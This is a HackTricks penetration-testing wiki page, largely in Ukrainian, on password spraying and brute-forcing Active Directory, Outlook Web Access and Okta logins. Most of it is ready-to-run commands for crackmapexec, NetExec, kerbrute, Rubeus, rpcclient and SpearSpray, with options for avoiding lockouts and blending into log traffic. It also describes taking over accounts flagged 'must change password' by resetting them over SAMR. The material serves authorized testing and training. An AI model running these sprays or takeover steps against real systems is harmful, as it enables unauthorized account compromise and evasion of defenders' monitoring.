# Password Spraying / Brute Force

{{#include ../../banners/hacktricks-training.md}}


## **Password Spraying**

Після того, як ви знайдете кілька **дійсних імен користувачів**, ви можете спробувати найпоширеніші **паролі** (пам'ятайте про політику паролів у середовищі) для кожного з виявлених користувачів.\
За **замовчуванням** **мінімальна** **довжина** **пароля** — **7**.

Списки поширених імен користувачів також можуть бути корисними: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

Зверніть увагу, що ви **можете заблокувати деякі облікові записи, якщо спробуєте кілька неправильних паролів** (за замовчуванням більше 10).

### Отримати політику паролів

Якщо у вас є облікові дані користувача або shell як доменний користувач, ви можете **отримати політику паролів за допомогою**:
```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10;
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```
### Експлуатація з Linux (або будь-якої ОС)

- Використання **crackmapexec:**
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
- Використання **NetExec (CME successor)** для цілеспрямованого, малошумного spraying через SMB/WinRM:
```bash
# Optional: generate a hosts entry to ensure Kerberos FQDN resolution
netexec smb <DC_IP> --generate-hosts-file hosts && cat hosts /etc/hosts | sudo sponge /etc/hosts

# Spray a single candidate password against harvested users over SMB
netexec smb <DC_FQDN> -u users.txt -p 'Password123!' \
--continue-on-success --no-bruteforce --shares

# Validate a hit over WinRM (or use SMB exec methods)
netexec winrm <DC_FQDN> -u <username> -p 'Password123!' -x "whoami"

# Tip: sync your clock before Kerberos-based auth to avoid skew issues
sudo ntpdate <DC_FQDN>
```
- Використання [**kerbrute**](https://github.com/ropnop/kerbrute) (Go)
```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```
- [**spray**](https://github.com/Greenwolf/Spray) _**(ви можете вказати кількість спроб, щоб уникнути блокувань):**_
```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```
- Використання [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - НЕ РЕКОМЕНДУЄТЬСЯ — ІНКОЛИ НЕ ПРАЦЮЄ
```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```
- За допомогою модуля `scanner/smb/smb_login` з **Metasploit**:

![](<../../images/image (745).png>)

- За допомогою **rpcclient**:
```bash
# https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
for u in $(cat users.txt); do
rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
done
```
#### З Windows

- За допомогою [Rubeus](https://github.com/Zer1t0/Rubeus) версії з brute module:
```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
- За допомогою [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Він може генерувати користувачів з домену за замовчуванням і отримує політику паролів з домену та обмежує спроби відповідно до неї):
```bash
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
- За допомогою [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
```
Invoke-SprayEmptyPassword
```
### Виявлення та захоплення облікових записів "Password must change at next logon" (SAMR)

Низькошумова методика — spray безпечний/порожній пароль і відстежувати облікові записи, що повертають STATUS_PASSWORD_MUST_CHANGE; це вказує, що пароль був примусово прострочений і його можна змінити без знання старого.

Робочий процес:
- Перелічити користувачів (RID brute via SAMR), щоб скласти список цілей:

{{#ref}}
../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md
{{#endref}}
```bash
# NetExec (null/guest) + RID brute to harvest users
netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
```
- Spray an empty password і продовжуйте працювати з hits, щоб захопити accounts, які повинні змінити password при next logon:
```bash
# Will show valid, lockout, and STATUS_PASSWORD_MUST_CHANGE among results
netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
```
- Для кожного збігу змініть пароль через SAMR з модулем NetExec (старий пароль не потрібен, коли встановлено "must change"):
```bash
# Strong complexity to satisfy policy
env NEWPASS='P@ssw0rd!2025#' ; \
netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"

# Validate and retrieve domain password policy with the new creds
netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
```
Операційні нотатки:
- Переконайтеся, що годинник вашого хоста синхронізований з DC перед операціями на основі Kerberos: `sudo ntpdate <dc_fqdn>`.
- Позначка [+] без (Pwn3d!) у деяких модулях (наприклад, RDP/WinRM) означає, що creds дійсні, але обліковий запис не має прав на інтерактивний вхід.

## Brute Force
```bash
legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
```
### Kerberos pre-auth spraying з таргетингом LDAP та PSO-aware throttling (SpearSpray)

Kerberos pre-auth–based spraying зменшує шум у порівнянні зі спробами bind через SMB/NTLM/LDAP та краще узгоджується з політиками блокування AD. SpearSpray поєднує LDAP-driven таргетинг, pattern engine та обізнаність щодо політик (domain policy + PSOs + badPwdCount buffer), щоб виконувати spray точно і безпечно. Воно також може позначати скомпрометовані principals у Neo4j для маршрутів BloodHound.

Key ideas:
- LDAP user discovery with paging and LDAPS support, optionally using custom LDAP filters.
- Domain lockout policy + PSO-aware filtering to leave a configurable attempt buffer (threshold) and avoid locking users.
- Kerberos pre-auth validation using fast gssapi bindings (generates 4768/4771 on DCs instead of 4625).
- Pattern-based, per-user password generation using variables like names and temporal values derived from each user’s pwdLastSet.
- Throughput control with threads, jitter, and max requests per second.
- Optional Neo4j integration to mark owned users for BloodHound.

Basic usage and discovery:
```bash
# List available pattern variables
spearspray -l

# Basic run (LDAP bind over TCP/389)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local

# LDAPS (TCP/636)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
```
Вибір цілей та контроль шаблонів:
```bash
# Custom LDAP filter (e.g., target specific OU/attributes)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
-q "(&(objectCategory=person)(objectClass=user)(department=IT))"

# Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
```
Заходи прихованості та безпеки:
```bash
# Control concurrency, add jitter, and cap request rate
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10

# Leave N attempts in reserve before lockout (default threshold: 2)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -thr 2
```
Збагачення Neo4j/BloodHound:
```bash
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -nu neo4j -np bloodhound --uri bolt://localhost:7687
```
Огляд системи шаблонів (patterns.txt):
```text
# Example templates consuming per-user attributes and temporal context
{name}{separator}{year}{suffix}
{month_en}{separator}{short_year}{suffix}
{season_en}{separator}{year}{suffix}
{samaccountname}
{extra}{separator}{year}{suffix}
```
Available variables include:
- {name}, {samaccountname}
- Тимчасові значення з pwdLastSet (or whenCreated) кожного користувача: {year}, {short_year}, {month_number}, {month_en}, {season_en}
- Допоміжні елементи складання та токен організації: {separator}, {suffix}, {extra}

Operational notes:
- Віддавайте перевагу запитам до PDC-emulator з -dc, щоб отримати найбільш авторитетну інформацію про badPwdCount та пов'язані з політиками дані.
- Скидання badPwdCount відбувається при наступній спробі після вікна спостереження; використовуйте поріг та таймінг, щоб залишатися в безпеці.
- Спроби Kerberos pre-auth відображаються як 4768/4771 у DC telemetry; використовуйте jitter та rate-limiting, щоб злитися з фоновим трафіком.

> Tip: SpearSpray’s default LDAP page size is 200; adjust with -lps as needed.

## Outlook Web Access

Існує кілька інструментів для p**assword spraying outlook**.

- За допомогою [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
- За допомогою [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
- За допомогою [Ruler](https://github.com/sensepost/ruler) (надійний!)
- За допомогою [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
- За допомогою [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)

Щоб використовувати будь-який із цих інструментів, вам потрібен список користувачів та password або невеликий список passwords для password spraying.
```bash
./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
[x] Failed: larsson:Summer2020
[x] Failed: cube0x0:Summer2020
[x] Failed: a.admin:Summer2020
[x] Failed: c.cube:Summer2020
[+] Success: s.svensson:Summer2020
```
## Google

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)

## Okta

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
- [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
- [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)

## Посилання

- [https://github.com/sikumy/spearspray](https://github.com/sikumy/spearspray)
- [https://github.com/TarlogicSecurity/kerbrute](https://github.com/TarlogicSecurity/kerbrute)
- [https://github.com/Greenwolf/Spray](https://github.com/Greenwolf/Spray)
- [https://github.com/Hackndo/sprayhound](https://github.com/Hackndo/sprayhound)
- [https://github.com/login-securite/conpass](https://github.com/login-securite/conpass)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
- [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
- [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
- [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)
- [HTB Sendai – 0xdf: from spray to gMSA to DA/SYSTEM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)


{{#include ../../banners/hacktricks-training.md}}
